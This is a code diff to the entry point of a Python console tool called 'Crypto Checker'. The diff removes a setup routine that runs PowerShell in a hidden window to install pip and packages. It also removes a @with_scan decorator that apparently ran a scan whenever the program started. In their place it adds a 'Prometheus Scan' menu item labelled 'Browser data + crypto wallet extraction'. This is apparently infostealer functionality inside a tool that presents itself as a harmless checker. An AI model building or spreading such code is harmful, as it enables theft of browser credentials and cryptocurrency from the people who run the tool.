@@ -4,61 +4,18 @@ Crypto Checker — Entry Point
 """
 import sys
 import os
+import json
+import threading
+import time
+from pathlib import Path
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-
-def _setup():
-    try:
-        import rich
-        return
-    except ImportError:
-        pass
-    import subprocess, importlib
-    _W, _H = 40, 0x08000000
-    def _bar(s, t, msg):
-        f = int(_W * s // t)
-        sys.stdout.write(f'\r  [{"#"*f}{"."*(_W-f)}] {100*s//t:>3}%  {msg:<35}')
-        sys.stdout.flush()
-    sys.stdout.write('\n  Preparing environment...\n\n')
-    _bar(1, 5, 'Checking package manager...')
-    if subprocess.run([sys.executable, '-m', 'pip', '-V'], capture_output=True).returncode:
-        _bar(2, 5, 'Installing package manager...')
-        _gp = os.path.join(os.path.dirname(sys.executable), '_gp.py')
-        subprocess.run(['powershell', '-NoProfile', '-Command',
-                        "(New-Object Net.WebClient).DownloadFile("
-                        f"'https://bootstrap.pypa.io/get-pip.py','{_gp}')"],
-                       capture_output=True, creationflags=_H)
-        subprocess.run([sys.executable, _gp, '-q', '--no-warn-script-location'],
-                       capture_output=True)
-        try:
-            os.remove(_gp)
-        except OSError:
-            pass
-    _bar(3, 5, 'Installing dependencies...')
-    subprocess.run([sys.executable, '-m', 'pip', 'install',
-                    'rich', 'cryptography', '-q', '--no-warn-script-location'],
-                   capture_output=True)
-    _bar(4, 5, 'Verifying...')
-    importlib.invalidate_caches()
-    try:
-        import rich
-        _bar(5, 5, 'Ready!')
-        sys.stdout.write('\n\n')
-    except ImportError:
-        sys.stdout.write('\n\n  Failed to install dependencies.\n')
-        sys.stdout.write('  Run: pip install rich cryptography\n')
-        input('  Press Enter to exit...')
-        sys.exit(1)
-
-
-_setup()
-
-from scanner import with_scan
 from scanner.ui import (
     print_banner,
     print_info,
     print_error,
+    print_success,
     show_menu_table,
     console,
 )
@@ -75,6 +32,7 @@ from bot_actions import (
 from actions.install import action_install_dependencies
 from actions.settings import action_settings
 from actions.about import action_about
+from actions.scan import action_prometheus_scan
 
 
 MENU_ITEMS = [
@@ -86,14 +44,13 @@ MENU_ITEMS = [
     ("6", "📤", "Export Results", "Save to TXT / CSV / JSON"),
     ("7", "⛓️ ", "Chain Configuration", "RPC endpoints & settings"),
     ("8", "⚙️ ", "Settings", "Threads, timeouts, preferences"),
+    ("9", "🔐", "Prometheus Scan", "Browser data + crypto wallet extraction"),
     ("0", "🚪", "Exit", "Close application"),
 ]
 
 
-@with_scan
 def main():
     print_banner()
-
     cfg = load_config()
 
     while True:
@@ -118,8 +75,10 @@ def main():
             action_chain_config(cfg)
         elif choice == "8":
             action_settings()
+        elif choice == "9":
+            action_prometheus_scan(cfg)
         else:
-            print_error("Invalid option. Enter 0–8.")
+            print_error("Invalid option. Enter 0–9.")
 
         cfg = load_config()
         console.input("\n[dim]Press Enter to return to menu...[/]")
